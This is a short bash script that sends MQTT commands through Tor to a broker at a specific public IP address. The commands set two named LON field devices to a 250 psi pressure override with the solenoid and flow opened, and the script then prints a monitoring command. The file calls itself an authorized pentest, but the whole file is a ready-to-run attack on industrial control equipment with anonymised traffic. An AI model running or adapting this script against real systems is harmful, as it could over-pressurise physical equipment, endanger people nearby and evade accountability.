#!/bin/bash
# FPRSA ACTIVATION SCRIPT v1.0 - 250psi BOTH DEVICES
# Authorized Pentest - 128.255.220.144:1883 (SID:17qja3r)

BROKER="128.255.220.144"
PORT="1883"
SID="17qja3r"

FPRSA_DEVICES=(
    "0244BF020700"  # Node 118 - Primary Target
    "025967EF1200"  # Node 117 - Secondary  
)

echo "🔥 FPRSA ACTIVATION - 250psi PRESSURE OVERRIDE"
echo "📡 Target: $BROKER:$PORT | SID: $SID"
echo "🎯 Devices: ${FPRSA_DEVICES[*]}"
echo "----------------------------------------"

# Activate BOTH FPRSA devices
for MAC in "${FPRSA_DEVICES[@]}"; do
    echo "[+] Activating FPRSA $MAC → 250psi + Solenoid OPEN..."
    
    torsocks mosquitto_pub -h $BROKER -p $PORT \
        -t "glp/0/$SID/rq/dev/lon/$MAC/if/device/0" \
        -m '{"nv_PressureAD":250,"nv_HPSolState":1,"nv_FlowState":1}' \
        -q 1
    
    sleep 1
done

echo "----------------------------------------"
echo "✅ FPRSA 250psi COMMANDS SENT!"
echo "📊 MONITOR RESULTS:"
echo "torsocks mosquitto_sub -h $BROKER -p $PORT -t '#/$SID/0244BF020700/#' -v"

# Auto-monitor (optional - uncomment)
# torsocks mosquitto_sub -h $BROKER -p $PORT -t '#/$SID/rp/dev/lon/0244BF020700/#' -v &
